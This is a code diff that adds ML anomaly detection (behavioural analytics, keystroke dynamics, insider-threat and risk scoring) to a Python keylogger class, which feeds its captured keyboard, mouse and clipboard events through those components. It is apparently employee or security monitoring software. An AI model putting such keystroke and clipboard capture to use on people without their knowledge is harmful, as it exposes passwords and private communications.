@@ -8,6 +8,7 @@ import logging
 import signal
 from typing import Dict, Any, Optional, List
 from pathlib import Path
+from datetime import datetime
 
 # Import core modules
 from .config_manager import ConfigManager
@@ -46,6 +47,22 @@ try:
 except Exception as e:
     logging.warning(f"CameraMonitor import failed: {e}")
     CameraMonitor = None
+
+# Import ML components
+try:
+    from ml.behavioral_analytics import BehavioralAnalyticsEngine
+    from ml.keystroke_dynamics import KeystrokeDynamicsAnalyzer
+    from ml.insider_threat import InsiderThreatDetector
+    from ml.risk_scoring import RealTimeRiskScorer
+    from ml.model_manager import ModelManager
+except Exception as e:
+    logging.warning(f"ML components import failed: {e}")
+    BehavioralAnalyticsEngine = None
+    KeystrokeDynamicsAnalyzer = None
+    InsiderThreatDetector = None
+    RealTimeRiskScorer = None
+    ModelManager = None
+
 logger = logging.getLogger(__name__)
 
 
@@ -235,8 +252,180 @@ class KeyloggerCore:
                     logger.info("Camera monitor initialized")
                 except Exception as e:
                     logger.error(f"Failed to initialize camera monitor: {e}")
+            
+            # Initialize ML components if enabled
+            self._initialize_ml_components()
+            
         except Exception as e:
             logger.error(f"Error initializing utilities: {e}")
+    
+    def _initialize_ml_components(self) -> None:
+        """Initialize ML anomaly detection components."""
+        try:
+            ml_enabled = self.config_manager.get('ml.enabled', True)
+            if not ml_enabled:
+                logger.info("ML components disabled in configuration")
+                return
+            
+            logger.info("Initializing ML anomaly detection components...")
+            
+            # Initialize Model Manager
+            if ModelManager is not None:
+                try:
+                    self.model_manager = ModelManager(self.config_manager)
+                    logger.info("Model manager initialized")
+                except Exception as e:
+                    logger.error(f"Failed to initialize model manager: {e}")
+            
+            # Initialize Behavioral Analytics Engine
+            if (self.config_manager.get('ml.behavioral_analytics.enabled', True) and 
+                BehavioralAnalyticsEngine is not None):
+                try:
+                    self.behavioral_analytics = BehavioralAnalyticsEngine(self.config_manager)
+                    logger.info("Behavioral analytics engine initialized")
+                except Exception as e:
+                    logger.error(f"Failed to initialize behavioral analytics: {e}")
+            
+            # Initialize Keystroke Dynamics Analyzer
+            if (self.config_manager.get('ml.keystroke_dynamics.enabled', True) and 
+                KeystrokeDynamicsAnalyzer is not None):
+                try:
+                    self.keystroke_dynamics = KeystrokeDynamicsAnalyzer(self.config_manager)
+                    logger.info("Keystroke dynamics analyzer initialized")
+                except Exception as e:
+                    logger.error(f"Failed to initialize keystroke dynamics: {e}")
+            
+            # Initialize Insider Threat Detector
+            if (self.config_manager.get('ml.insider_threat.enabled', True) and 
+                InsiderThreatDetector is not None):
+                try:
+                    self.insider_threat_detector = InsiderThreatDetector(self.config_manager)
+                    logger.info("Insider threat detector initialized")
+                except Exception as e:
+                    logger.error(f"Failed to initialize insider threat detector: {e}")
+            
+            # Initialize Real-time Risk Scorer
+            if (self.config_manager.get('ml.risk_scoring.enabled', True) and 
+                RealTimeRiskScorer is not None):
+                try:
+                    self.risk_scorer = RealTimeRiskScorer(self.config_manager)
+                    logger.info("Real-time risk scorer initialized")
+                except Exception as e:
+                    logger.error(f"Failed to initialize risk scorer: {e}")
+            
+            logger.info("ML components initialization completed")
+            
+        except Exception as e:
+            logger.error(f"Error initializing ML components: {e}")
+    
+    def _process_ml_event(self, event_type: str, content: Any, window: Optional[str] = None, metadata: Dict[str, Any] = None) -> None:
+        """Process event through ML anomaly detection components."""
+        try:
+            # Skip ML processing if ML is disabled
+            if not self.config_manager.get('ml.enabled', True):
+                return
+            
+            # Create event object for ML processing
+            event = {
+                'timestamp': datetime.now().isoformat(),
+                'type': event_type,
+                'data': {
+                    'content': content,
+                    'window': window,
+                    'metadata': metadata or {}
+                }
+            }
+            
+            # Add event-specific data
+            if event_type == 'keyboard':
+                # Add keyboard-specific data
+                if isinstance(content, dict):
+                    event['data'].update(content)
+                else:
+                    event['data']['key'] = str(content)
+            elif event_type == 'mouse':
+                # Add mouse-specific data
+                if isinstance(content, dict):
+                    event['data'].update(content)
+            elif event_type == 'clipboard':
+                # Add clipboard-specific data
+                if isinstance(content, dict):
+                    event['data'].update(content)
+                else:
+                    event['data']['content'] = str(content)
+            
+            # Process through Behavioral Analytics
+            if hasattr(self, 'behavioral_analytics') and self.behavioral_analytics:
+                try:
+                    ba_result = self.behavioral_analytics.process_event(event)
+                    if ba_result.get('is_anomaly', False):
+                        self._handle_ml_anomaly('behavioral_analytics', ba_result, event)
+                except Exception as e:
+                    logger.warning(f"Error in behavioral analytics processing: {e}")
+            
+            # Process through Keystroke Dynamics (keyboard events only)
+            if (event_type == 'keyboard' and 
+                hasattr(self, 'keystroke_dynamics') and self.keystroke_dynamics):
+                try:
+                    kd_result = self.keystroke_dynamics.process_keystroke(event)
+                    if kd_result.get('status') == 'completed':
+                        # Check authentication results
+                        auth_result = kd_result.get('authentication', {})
+                        if not auth_result.get('authenticated', True):
+                            self._handle_ml_anomaly('keystroke_dynamics', kd_result, event)
+                except Exception as e:
+                    logger.warning(f"Error in keystroke dynamics processing: {e}")
+            
+            # Process through Insider Threat Detection
+            if hasattr(self, 'insider_threat_detector') and self.insider_threat_detector:
+                try:
+                    threat_score = self.insider_threat_detector.analyze_event(event)
+                    threat_threshold = self.config_manager.get('ml.insider_threat.threshold', 0.7)
+                    if threat_score > threat_threshold:
+                        self._handle_ml_anomaly('insider_threat', {'threat_score': threat_score}, event)
+                except Exception as e:
+                    logger.warning(f"Error in insider threat detection: {e}")
+            
+            # Process through Risk Scoring
+            if hasattr(self, 'risk_scorer') and self.risk_scorer:
+                try:
+                    risk_score = self.risk_scorer.calculate_risk(event)
+                    risk_threshold = self.config_manager.get('ml.risk_scoring.threshold', 0.8)
+                    if risk_score > risk_threshold:
+                        self._handle_ml_anomaly('risk_scoring', {'risk_score': risk_score}, event)
+                except Exception as e:
+                    logger.warning(f"Error in risk scoring: {e}")
+            
+        except Exception as e:
+            logger.error(f"Error in ML event processing: {e}")
+    
+    def _handle_ml_anomaly(self, component: str, result: Dict[str, Any], event: Dict[str, Any]) -> None:
+        """Handle ML anomaly detection results."""
+        try:
+            # Log the anomaly
+            anomaly_data = {
+                'component': component,
+                'result': result,
+                'original_event': event,
+                'detection_time': datetime.now().isoformat()
+            }
+            
+            # Log as security event
+            self.log_event('ml_anomaly', anomaly_data, metadata={'severity': 'high'})
+            
+            # Update ML statistics
+            if not hasattr(self, 'ml_stats'):
+                self.ml_stats = {'anomalies_detected': 0, 'by_component': {}}
+            
+            self.ml_stats['anomalies_detected'] += 1
+            if component not in self.ml_stats['by_component']:
+                self.ml_stats['by_component'][component] = 0
+            self.ml_stats['by_component'][component] += 1
+            
+            logger.warning(f"ML Anomaly detected by {component}: {result}")
+            
+        except Exception as e:
+            logger.error(f"Error handling ML anomaly: {e}")
     
     def start(self) -> bool:
         """Start the keylogger."""
@@ -461,6 +650,9 @@ class KeyloggerCore:
                     self.stats['mouse_events'] += 1
                 elif event_type == 'clipboard':
                     self.stats['clipboard_events'] += 1
+                
+                # Process event through ML components
+                self._process_ml_event(event_type, content, window, metadata)
             
             return success
             
